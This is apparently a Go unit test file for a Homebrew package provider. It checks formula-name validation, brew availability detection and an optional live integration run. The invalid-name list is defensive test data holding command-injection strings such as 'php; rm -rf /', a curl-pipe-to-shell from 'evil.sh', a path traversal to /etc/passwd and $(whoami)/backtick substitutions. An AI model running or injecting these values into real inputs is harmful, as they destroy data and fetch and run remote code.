package brew

import (
	"context"
	"testing"
)

func TestValidateName(t *testing.T) {
	valid := []string{"php", "php@8.3", "mysql", "node", "shivammathur/php/php@8.3", "redis6.2"}
	for _, name := range valid {
		if err := ValidateName(name); err != nil {
			t.Errorf("expected %q to be valid, got error: %v", name, err)
		}
	}

	invalid := []string{
		"", "php; rm -rf /", "php && curl evil.sh | sh", "-rf", "../../etc/passwd",
		"php$(whoami)", "php`id`", "a/b/c/d",
	}
	for _, name := range invalid {
		if err := ValidateName(name); err == nil {
			t.Errorf("expected %q to be rejected, got no error", name)
		}
	}
}

func TestAvailableFalseWhenBrewMissing(t *testing.T) {
	p := New(nil, nil, t.TempDir())
	p.lookPath = func(string) (string, error) { return "", context.DeadlineExceeded }
	if p.Available() {
		t.Fatalf("expected Available() to be false when lookPath fails")
	}
}

func TestAvailableTrueWhenBrewFound(t *testing.T) {
	p := New(nil, nil, t.TempDir())
	p.lookPath = func(string) (string, error) { return "/usr/local/bin/brew", nil }
	if !p.Available() {
		t.Fatalf("expected Available() to be true when lookPath succeeds")
	}
}

// TestLiveIntegration exercises Search/ListInstalled against the real
// `brew` binary if one happens to be on this machine's PATH -- skipped
// otherwise, exactly like internal/providers/docker's own live test does
// for a real Docker daemon. Never assumed present; CI and most dev
// machines won't have Homebrew, and that's fine.
func TestLiveIntegration(t *testing.T) {
	p := New(nil, nil, t.TempDir())
	if !p.Available() {
		t.Skip("brew not on PATH, skipping live integration test")
	}

	ctx := context.Background()
	installed, err := p.ListInstalled(ctx)
	if err != nil {
		t.Fatalf("ListInstalled: %v", err)
	}
	t.Logf("found %d installed formulae", len(installed))
}
